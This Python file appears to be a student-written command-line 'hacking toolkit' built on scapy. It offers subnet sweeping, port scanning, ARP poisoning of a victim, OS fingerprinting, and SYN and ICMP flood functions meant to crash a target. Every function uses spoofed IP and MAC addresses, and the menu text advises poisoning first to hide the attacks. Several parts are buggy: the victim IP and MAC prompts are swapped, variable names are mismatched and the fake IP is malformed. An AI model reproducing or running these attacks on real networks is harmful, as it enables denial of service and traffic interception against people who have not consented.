# -*- coding: utf-8 -*-

"""RT_Hack

Usage:
  rt_hack
  rt_hack (-h | --help)
  rt_hack --version

Options:
  -h --help     Show this screen.
  --version     Show version.

"""

__author__ = """Jean-Hieu HUYNH"""
__email__ = 'jean-hieu.huynh@ensea.fr'
__version__ = '0.0.1'

import logging
from docopt import docopt
from scapy.all import *
import random

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

target_IP = None
"""List of reachable IP addresses"""

target_port = None
"""List of open ports"""

myIP = None
"""My real IP address"""

myMAC = None
"""My real MAC address"""

myFakeIP = None
"""My fake IP address used for IP spoofing"""

myFakeMAC = None
"""My fake MAC address used for IP spooding"""

usedIP = None
"""Used IP address"""

usedMAC = None
"""Used MAC address"""

################################################################################

def sweep_subnet():
    """Stores the reachable IP addresses of the subnet given in CLI"""
    global target_IP
    global usedIP
    res = []
    print('\nYou chose to sweep subnet.')
    subnet = str(input('Please enter the subnet you wish to sweep : '))
    icmp = IP(dst=subnet, src=usedIP) / ICMP() / "12345678"

    print("Start sweeping subnet")
    ans, nans = sr(icmp, timeout=5, verbose=0)
    print("Sweeping done")
    for i in range(len(ans)):
        res.append(ans[i][1].src)
    target_IP = res
    


def scan_port():
    """Stores the available port of the IP address given in CLI"""
    global target_port
    global usedIP
    res = []
    target = str(input('Please enter the IP address you wish to scan : '))
    p_scan = IP(dst=target, src=usedIP) / TCP(dport=(0, 64000), flags="S");

    print("Start scanning")
    ans, nans = sr(p_scan, timeout = 5, verbose=0);
    print("Scan done")
    for i in range(len(ans)):
        res.append(ans[i][1].sport)
    target_port = res


def arp_pois():
    """ARP poisons the victim given in CLI using the fake IP and MAC addresses"""
    global usedIP, usedMAC
    global myFakeIP, myFakeMAC

    usedIP = myFakeIP
    usedMAC = myFakeMAC

    print('Start ARP poisoning...')
    targetMac = str(input('Please enter the IP address of the victim : '))
    targetIP = str(input('Please enter the MAC address of the victim : '))
    arp_pois = Ether(dst=targetMAC, src=myFakeMAC) / ARP(op=2,
                                                         hwsrc=myFakeMAC,
                                                         psrc=myFakeIP,
                                                         hwdst=targetMAC,
                                                         pdst=targetIP)
    srploop(arp_pois)


def find_OS():
    """Displays what OS the victim given in CLI is running"""
    global usedIP
    target = str(input('Please enter the targetted IP address : '))
    onlyfin = IP(dst=target, src=usedIP) / TCP(dport=150, flags="F")
    ans, nans = sr(onlyfin, verbose=0)
    if len(ans) == 0:
        print('Victim is running Ubuntu')
    elif ans[0][1]['TCP'].flags == 20:
        print('Victim is running Windows')

################################################################################

def syn_flood():
    """Crashes a victim given in CLI using SYN flood"""
    global usedIP
    target = str(input('Please enter the targetted IP address : '))
    synflood = IP(dst=target, src=usedIP+'/16') / TCP(dst=80, flags="S")
    while(1):
        send(synflood)


def icmp_flood():
    """Crashes a victim given in CLI using ICMP flood (Only efficient if you have more bandwidth than the victim)"""
    global usedIP
    target = str(input('Please enter the targetted IP address : '))
    icmp = IP(dst=target, src=usedIP) / ICMP() / "1234567890"
    while(1):
        send(icmp)


################################################################################

def initFake():
    """Initialize fake IP and MAC address"""
    global myFakeIP
    global myFakeMAC

    print('\nInitializing fake IP and MAC address')
    myFakeMAC = "52:54:00:%02x:%02x:%02x" %(random.randint(0, 255),
                                        random.randint(0, 255),
                                        random.randint(0, 255))
    myFakeIP = "192:168:%d:%d" %(random.randint(0, 255), random.randint(0, 255))
    print('New IP address is', myFakeIP)
    print('New MAC address is', myFakeMAC, '\n')


def find_IP():
    """Find out you IP address"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('google.com', 0))
    return s.getsockname()[0]

################################################################################

def printIP():
    """Prints the IP addresses contained in global variable target_IP"""
    global target_IP
    if target_IP is None:
        print('IP list is empty. Please use the sweep_subnet function first.')
    else:
        print('Available IPs are :', target_IP)


def printPorts():
    """Prints the ports contained in global variable target_port"""
    global target_IP
    if target_port is None:
        print('Port list is empty. Please use the scan_port function first.')
    else:
        print('Available ports are :', target_port)

################################################################################

def ascii_art():
    import sys

    from colorama import init
    init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
    from termcolor import cprint 
    from pyfiglet import figlet_format

    cprint(figlet_format('Supreme Hacking Toolkit', font='starwars'), 
           'yellow', attrs=['bold'])

################################################################################

def main():
    """Main function that acts as a CLI"""
    global myIP, myMAC
    global myFakeIP, myFakeMAC
    global usedIP, usedMAC

    ascii_art()

    print ("Welcome to the hacking toolkit made by JH.")

    print('It is recommended to start with ARP poisoning once you found your victim to hide your attacks !')

    myIP = find_IP()
    usedIP = myIP


    initFake()
    func = [printIP, printPorts,
            sweep_subnet, scan_port, arp_pois, find_OS,
            syn_flood, icmp_flood]

    invalid_input = True
    def start() :
        for a, b in enumerate(func, 1):
            print('{} - {} : {}'.format(a, b.__name__, b.__doc__))
        op = input ("Please input what operation you wish to perform : ")

        if int(op) <= len(func):
            func[int(op)-1]()
            invalid_input = False # Set to False because input was valid
        else:
            print ("Sorry, that was an invalid command!")

    while invalid_input : # this will loop until invalid_input is set to be True
        start()
        print('\n')


if __name__ == '__main__':
    main()
